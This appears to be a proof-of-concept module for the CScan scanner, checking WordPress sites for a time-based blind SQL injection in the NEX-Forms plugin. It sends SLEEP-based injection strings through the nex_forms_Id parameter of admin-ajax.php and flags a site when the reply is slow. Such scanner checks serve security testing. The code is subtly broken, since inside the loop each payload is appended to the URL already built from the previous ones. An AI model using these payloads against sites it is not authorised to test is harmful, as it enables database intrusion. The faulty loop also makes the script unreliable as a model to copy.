# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time

class Vuln(ABVuln):
    poc_id = '419f358f-4e23-4180-8dad-7ae59fd5168a'
    name = 'WordPress NEX-Forms SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-04-21'  # 漏洞公布时间
    desc = '''
        There are sql injection vulnerabilities in NEX-Forms Plugin
        which could allow the attacker to execute sql queries into database.
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/36800/'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Plugin NEX-Forms < 3.0'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'afc7d0ae-a18f-4a9c-a32e-f9be808ae6de'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-04'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            verify_url = self.target
            payloads = {'/wp-admin/admin-ajax.php?action=submit_nex_form&nex_forms_Id=10 AND (SELECT * FROM (SELECT(SLEEP(10)))NdbE)',
                        '/wp-admin/admin-ajax.php?action=submit_nex_form&nex_forms_Id=1 and sleep(5)',
                        '/wp-admin/admin-ajax.php?action=submit_nex_form&nex_forms_Id=10 and sleep(5)'
                        }
            for payload in payloads:
                verify_url += payload
                start_time = time.time()

                req = requests.get(verify_url).content
                if time.time() - start_time > 5:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
